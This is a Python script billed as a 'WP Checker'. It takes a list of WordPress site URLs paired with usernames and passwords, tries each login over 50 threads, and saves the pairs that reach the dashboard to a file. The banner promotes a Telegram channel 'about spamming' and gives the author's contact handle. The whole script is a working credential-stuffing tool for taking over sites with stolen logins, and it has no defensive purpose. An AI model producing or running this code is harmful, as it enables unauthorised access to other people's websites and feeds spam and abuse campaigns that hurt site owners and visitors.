import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

init(autoreset=True)

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}

def attempt_login(wp_url_credentials):
    try:
        parts = wp_url_credentials.split("#")
        site = parts[0]
        creds = parts[1].split("@")
        user, passwd = creds
        response = requests.post(site, headers=headers, data={'log': user, 'pwd': passwd, 'wp-submit': 'Log In'}, timeout=10)
        if 'Dashboard' in response.text:
            print(Fore.GREEN + f"[Success] --> {site}"), print(Fore.MAGENTA + "Joe_1337")
            with open("wp-login-success.txt", "a") as file:
                file.write(f"{site}#{user}@{passwd}\n")
        else:
            print(Fore.RED + f"[Failed] --> {site}")
    except (requests.exceptions.SSLError, requests.exceptions.ConnectionError) as e:
        pass
    except Exception as e:
        pass

def main():
    init(autoreset=True)

    banner_part1 = Fore.BLUE + """
    ██╗    ██╗██████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
    ██║    ██║██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║ █╗ ██║██████╔╝    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
    ██║███╗██║██╔═══╝     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║         ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝          ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """

    banner_part2 = Fore.MAGENTA + """
    For more tools and info about spamming, 
    join my Telegram channel: https://t.me/thedrunkenbears

    For direct contact and inquiries, 
    reach out to the owner Telegram: @joee_1337
    """

    print(banner_part1 + banner_part2)

    print(Fore.BLUE + "Enter the path to your list: ", end="")
    file_path = input()
    try:
        with open(file_path, 'r') as file:
            wp_list = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "File not found, please check the path and try again.")
        return

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(attempt_login, wp_list)

if __name__ == "__main__":
    main()
